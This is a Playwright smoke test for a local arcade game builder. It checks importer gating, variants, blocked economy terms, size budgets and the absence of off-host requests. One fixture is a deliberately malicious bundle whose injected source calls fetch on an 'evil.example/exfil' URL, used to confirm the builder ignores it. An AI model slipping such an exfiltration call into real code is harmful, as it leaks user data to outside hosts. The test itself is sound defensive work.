/**
 * Creator Foundation — Local Arcade Builder browser smoke.
 *
 * Loads the offline builder, checks: default build passes the CF-4 importer gate (VALID), the eight
 * closed variants all generate importer-clean source, an economy term in display_name → BLOCKED, an
 * impossible size budget → BLOCKED, generated source carries no forbidden constructs (the importer's
 * own scan is the oracle), export gates on validity, result trust stays untrusted_local_proposal,
 * no off-host network, no console errors.
 * Run: tests/creator/run-arcade-builder.sh
 */
import { createRequire } from 'node:module';
const require = createRequire(process.env.PW_REQUIRE_BASE || import.meta.url);
const { chromium } = require('playwright');
const BASE = process.env.BASE_URL || 'http://127.0.0.1:8096';

let fail = 0;
const check = (n, c) => { console.log(`${c ? 'ok  ' : 'FAIL'} ${n}`); if (!c) fail++; };
const browser = await chromium.launch({ headless: true });
try {
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  const errors = [];
  const offHost = [];
  page.on('pageerror', (e) => errors.push('pageerror: ' + e.message));
  page.on('console', (m) => { if (m.type() === 'error') errors.push('console: ' + m.text()); });
  page.on('request', (r) => { const u = new URL(r.url()); if (!['127.0.0.1', 'localhost'].includes(u.hostname)) offHost.push(r.url()); });

  await page.goto(`${BASE}/arcade/creator/arcade-builder/`, { waitUntil: 'load', timeout: 20000 });
  await page.waitForFunction(() => window.__cf_builder && window.__cf_builder.lastReport, null, { timeout: 8000 });

  check('default build passes the CF-4 importer gate (VALID)', await page.evaluate(() => window.__cf_builder.lastReport.ok === true));
  check('verdict shows untrusted-local-proposal trust', /untrusted_local_proposal/.test(await page.evaluate(() => document.getElementById('sizes').textContent)));
  check('export enabled on valid', !(await page.evaluate(() => document.getElementById('exportAll').disabled)));
  check('manifest is a complete arcade_game package', await page.evaluate(() => {
    const m = window.__cf_builder.lastBuild.manifest;
    return m.package_kind === 'arcade_game' && m.entry === 'game.mjs' && m.adapter === 'adapter.mjs' && m.assets.length === 0 && m.capabilities.length === 0;
  }));

  // all fourteen closed variants generate importer-clean source
  const ALL_VARIANTS = ['pulse-ring', 'drift-band', 'tri-light', 'orbit-catch', 'tide-gate', 'split-pulse', 'rail-runner', 'echo-grid',
    'phase-lock', 'heat-sync', 'light-bloom', 'signal-climb', 'crosswalk-pulse', 'memory-echo'];
  for (const v of ALL_VARIANTS) {
    await page.selectOption('#variant', v);
    await page.waitForTimeout(100);
    check(`variant ${v} → importer VALID`, await page.evaluate(() => window.__cf_builder.lastReport.ok === true));
  }
  check('variants generate different game source', await page.evaluate(async (variants) => {
    const srcs = new Set();
    for (const v of variants) {
      document.getElementById('variant').value = v;
      window.__cf_builder.refresh();
      srcs.add(window.__cf_builder.lastBuild.files['game.mjs']);
    }
    return srcs.size === variants.length;
  }, ALL_VARIANTS));
  check('generated source proposes results only (no authority claims)', await page.evaluate(() => /proposeResult/.test(window.__cf_builder.lastBuild.files['game.mjs']) && /public_safe: true/.test(window.__cf_builder.lastBuild.files['game.mjs'])));
  check('generated adapter imports only ./game.mjs', await page.evaluate(() => {
    const a = window.__cf_builder.lastBuild.files['adapter.mjs'];
    const imports = a.match(/import[^;]+;/g) || [];
    return imports.length === 1 && /from '\.\/game\.mjs'/.test(imports[0]);
  }));

  // throughput: starters are named parameter presets — picking one re-gates through the importer
  await page.selectOption('#template', 'orbit-snag');
  await page.waitForTimeout(100);
  check('starter applies its closed params + naming and stays importer-VALID', await page.evaluate(() => {
    const p = window.__cf_builder.currentParams();
    return p.variant === 'orbit-catch' && p.accent === 'cyan' && p.speed === 'fast'
      && p.package_id === 'orbit-snag' && p.display_name === 'Orbit Snag' && window.__cf_builder.lastReport.ok === true;
  }));
  check('starter metadata card renders pitch + tags + notes (closed copy)', await page.evaluate(() => {
    const m = document.getElementById('starterMeta');
    return m && !m.hidden && /Snag the satellite/.test(m.textContent) && /Position/.test(m.textContent) && /Reduced motion/.test(m.textContent);
  }));
  check('starter library exposes ≥12 starters in the picker', await page.evaluate(() =>
    window.__cf_builder.starterCount >= 12 && document.querySelectorAll('#template option').length >= 13));
  check('bundle export enabled on valid', !(await page.evaluate(() => document.getElementById('exportBundle').disabled)));

  // juice + input-mode closed tokens reach generated source (and only via the tables)
  await page.selectOption('#juice', 'off');
  await page.selectOption('#inputMode', 'hold_band');
  await page.waitForTimeout(100);
  check('juice off + hold_band resolve through the frozen tables into source', await page.evaluate(() => {
    const src = window.__cf_builder.lastBuild.files['game.mjs'];
    return /const FX = RM \? 0 : 0;/.test(src) && /const MODE = 'hold_band';/.test(src) && window.__cf_builder.lastReport.ok === true;
  }));
  await page.selectOption('#juice', 'standard');
  await page.selectOption('#inputMode', 'tap_window');
  await page.waitForTimeout(100);

  // throughput: bundle import restores PARAMS ONLY — bundled source is ignored and regenerated
  await page.setInputFiles('#importBundle', {
    name: 'evil.builder.json',
    mimeType: 'application/json',
    buffer: Buffer.from(JSON.stringify({
      schema_version: 1,
      bundle_kind: 'arcade_builder_bundle',
      builder_params: { package_id: 'restored-cab', display_name: 'Restored Cabinet', variant: 'tri-light', accent: 'green', speed: 'slow', difficulty: 'chill', motion: 'calm', juice: 'off', input_mode: 'swipe_lane', frame: 'cabinet-480x480', budget: 32768 },
      files: { 'game.mjs': 'fetch("https://evil.example/exfil"); // MALICIOUS_MARKER' },
      manifest: { package_id: 'evil-injected' },
    })),
  });
  await page.waitForFunction(() => window.__cf_builder.currentParams().package_id === 'restored-cab', null, { timeout: 4000 });
  check('bundle import restores parameters through the closed tables', await page.evaluate(() => {
    const p = window.__cf_builder.currentParams();
    return p.variant === 'tri-light' && p.accent === 'green' && p.speed === 'slow' && p.display_name === 'Restored Cabinet'
      && p.frame === 'cabinet-480x480' && p.difficulty === 'chill' && p.motion === 'calm'
      && p.juice === 'off' && p.input_mode === 'swipe_lane';
  }));
  check('bundled source is IGNORED — generated game.mjs carries none of it', await page.evaluate(() =>
    !/MALICIOUS_MARKER|evil\.example|evil-injected/.test(window.__cf_builder.lastBuild.files['game.mjs'] + JSON.stringify(window.__cf_builder.lastBuild.manifest))));
  check('post-import build is importer-VALID (regenerated, re-gated)', await page.evaluate(() => window.__cf_builder.lastReport.ok === true));

  // economy term in display name → BLOCKED by the shared manifest validator
  await page.fill('#displayName', 'Big Payout Machine');
  await page.waitForFunction(() => window.__cf_builder.lastReport.ok === false, null, { timeout: 4000 });
  check('economy term in display name → BLOCKED', /BLOCKED/.test(await page.evaluate(() => document.getElementById('verdict').textContent)));
  check('export disabled while blocked', await page.evaluate(() => document.getElementById('exportAll').disabled === true));
  check('issues panel carries a friendly hint for the block (throughput explainer)', await page.evaluate(() => /→ /.test(document.getElementById('issues').textContent)));
  await page.fill('#displayName', 'My First Cabinet');
  await page.waitForFunction(() => window.__cf_builder.lastReport.ok === true, null, { timeout: 4000 });

  // impossible declared budget → files exceed it → BLOCKED
  await page.fill('#budget', '1024');
  await page.evaluate(() => { document.getElementById('budget').dispatchEvent(new Event('change')); });
  await page.waitForFunction(() => window.__cf_builder.lastReport.ok === false, null, { timeout: 4000 });
  check('files over declared budget → BLOCKED', await page.evaluate(() => window.__cf_builder.lastReport.errors.some((e) => /exceed declared size_budget_bytes/.test(e))));
  await page.fill('#budget', '32768');
  await page.evaluate(() => { document.getElementById('budget').dispatchEvent(new Event('change')); });
  await page.waitForFunction(() => window.__cf_builder.lastReport.ok === true, null, { timeout: 4000 });

  check('no off-host network requests', offHost.length === 0);
  check('no console / page errors', errors.length === 0);
  if (errors.length) console.log(errors.slice(0, 5).join('\n'));
} finally {
  await browser.close();
}
console.log(fail === 0 ? 'ARCADE BUILDER SMOKE: PASS' : `ARCADE BUILDER SMOKE: ${fail} FAILURE(S)`);
process.exit(fail === 0 ? 0 : 1);
